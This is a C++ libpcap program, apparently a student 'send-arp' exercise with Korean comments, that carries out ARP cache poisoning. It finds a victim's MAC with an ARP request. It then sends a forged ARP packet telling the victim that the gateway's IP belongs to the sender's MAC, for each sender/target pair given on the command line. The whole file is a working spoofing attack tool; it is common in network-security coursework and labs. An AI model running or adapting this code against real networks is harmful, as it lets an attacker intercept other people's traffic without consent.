#include <pcap.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <ifaddrs.h> // 네트워크 인터페이스 정보를 가져오기 위한 헤더 파일
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


// MAC 주소를 문자열로 반환하는 함수
int get_wlan_ip(char *ifname, char *ip) {
    struct ifaddrs *ifaddr, *ifa;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return -1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        if (strncmp(ifa->ifa_name, ifname, 4) == 0) {
            if (ifa->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
                inet_ntop(AF_INET, &(sa->sin_addr), ip, INET_ADDRSTRLEN);

                freeifaddrs(ifaddr);
                return 0;
            }
        }
    }
    freeifaddrs(ifaddr);
    return -1;
}

int get_wlan_mac(char *ifname, unsigned char *mac) {
    struct ifaddrs *ifaddr, *ifa;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return -1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        if (strncmp(ifa->ifa_name, ifname, 4) == 0) {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock == -1) {
                perror("socket");
                freeifaddrs(ifaddr);
                return -1;
            }

            struct ifreq ifr;
            strncpy(ifr.ifr_name, ifa->ifa_name, IFNAMSIZ-1);
            ifr.ifr_name[IFNAMSIZ-1] = '\0';

            if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
                close(sock);
                freeifaddrs(ifaddr);
                return 0;
            } else {
                perror("ioctl");
                close(sock);
            }
        }
    }

    freeifaddrs(ifaddr);
    return -1;
}


int arp_packat(char* ifname, char* victim_addr, char* gateway_addr) {
	char* dev = ifname;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
		return -1;
	}
	EthArpPacket packet;
	unsigned char my_mac[6];
	get_wlan_mac(dev, my_mac);
	char my_ip[INET_ADDRSTRLEN];
	get_wlan_ip(dev, my_ip);
	Mac victim_mac;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //victim MAC
	packet.eth_.smac_ = Mac(my_mac); //my MAC
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac); //my MAC
	packet.arp_.sip_ = htonl(Ip(my_ip)); //my IP
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //victim MAC
	packet.arp_.tip_ = htonl(Ip(victim_addr)); //victim IP

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		struct EthHdr *eth = (struct EthHdr *)packet;
		if(eth->type() == 0x0806)
		{
			victim_mac = eth->smac();
			break;
		}
	}

	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet1;

	packet1.eth_.dmac_ = Mac(victim_mac); //victim MAC
	packet1.eth_.smac_ = Mac(my_mac); //my MAC
	packet1.eth_.type_ = htons(EthHdr::Arp);
	packet1.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet1.arp_.pro_ = htons(EthHdr::Ip4);
	packet1.arp_.hln_ = Mac::SIZE;
	packet1.arp_.pln_ = Ip::SIZE;
	packet1.arp_.op_ = htons(ArpHdr::Request);
	packet1.arp_.smac_ = Mac(my_mac); //my MAC
	packet1.arp_.sip_ = htonl(Ip(gateway_addr)); //gateway
	packet1.arp_.tmac_ = victim_mac; //victim MAC
	packet1.arp_.tip_ = htonl(Ip(victim_addr)); //victim IP

	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	pcap_close(handle);
	return 0;
}


void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}
int main(int argc, char* argv[])
{
	char ifname[100];
	strcpy(ifname, argv[1]);
	char sender[100][100];
	char target[100][100];
	int s_index = 0;
	int t_index = 0;
	for(int i=2; i<argc; i++)
	{
		//printf("%d\n", i);
		if(i % 2== 0)
		{
            strncpy(sender[s_index], argv[i], 15);
            sender[s_index][15] = '\0';
            //printf("sender: %s\n", sender[s_index]);
            s_index++;
		}
		else
		{
			strncpy(target[t_index], argv[i], 15);
            target[t_index][15] = '\0';
            //printf("target: %s\n", target[t_index]);
            t_index++;
		}
	}
	for(int i=0; i < s_index; i++)
	{
		arp_packat(ifname, sender[i], target[i]);
	}

	return 0;
}

